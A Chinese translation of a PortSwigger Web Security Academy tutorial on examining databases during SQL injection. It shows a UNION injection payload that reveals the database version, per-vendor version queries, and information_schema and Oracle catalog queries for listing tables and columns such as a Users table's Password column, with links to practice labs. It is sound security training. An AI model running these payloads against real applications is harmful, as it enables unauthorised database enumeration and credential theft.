---
description: '原文链接：https://portswigger.net/web-security/sql-injection/examining-the-database'
---

# 在SQL注入攻击中检索数据库

当利用 [SQL 注入](https://portswigger.net/web-security/sql-injection)漏洞时，收集数据库本身的信息通常是必要的。这包括数据库软件的类型和版本，还包括数据库中包含的表和列等内容。

### 查询数据库类型和版本

不同的数据库提供不同的版本查询方式。你通常需要尝试不同的查询方式，以找到一个有效的查询方式，能够确定数据库软件的类型和版本。

用于确定某些常用数据库类型的数据库版本的查询如下：

| 数据库类型       | 查询                      |
| :--------------- | :------------------------ |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

例如，你可以使用带有下边的 `UNION` 攻击：

```sql
' UNION SELECT @@version--
```

这可能会返回类似下面的输出，确认数据库是 Microsoft SQL Server，以及正在使用的版本。

```text
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

{% hint style="warning" %}
**实验：**[SQL 注入攻击，在 Oracle 中查询数据库类型和版本](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
{% endhint %}

{% hint style="warning" %}
**实验：**[SQL 注入攻击，在 MySQL 和微软中查询数据库类型和版本](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
{% endhint %}

### 列出数据库的内容

大多数数据库类型（Oracle 是个明显的例外）都有一组被称作 information schema 的视图，这些视图提供有关数据库的信息。

你可以通过查询 `information_schema.tables` 来列出数据库的表：

```sql
SELECT * FROM information_schema.tables
```

返回输出如下：

```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME    TABLE_TYPE
=====================================================
MyDatabase    dbo          Products BASE TABLE
MyDatabase    dbo          Users BASE    TABLE
MyDatabase    dbo          Feedback BASE TABLE
```

这些输出表明库中有三个表，分别是 `Products`, `Users`, `Feedback`。

你可以通过查询 `information_schema.columns` 列出特定表中的列：

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

返回输出如下：

```sql
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase    dbo          Users      UserId      int
MyDatabase    dbo          Users      Username    varchar
MyDatabase    dbo          Users      Password    varchar
```

此输出显示了指定表中的列以及每列的数据类型。

{% hint style="warning" %}
**实验：**[SQL 注入攻击，在非 Oracle 数据库中列出数据库内容](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
{% endhint %}

### 等效于Oracle中的information schema

在 Oracle 中，你可以通过稍有差异的查询获取同样的信息。

你可以通过查询 `all_tables` 列出表：

```sql
SELECT * FROM all_tables
```

还可以通过查询 `all_tab_columns` 列出列：

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

{% hint style="warning" %}
实验：[SQL 注入攻击，在 Oracle 中列出数据库内容](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
{% endhint %}

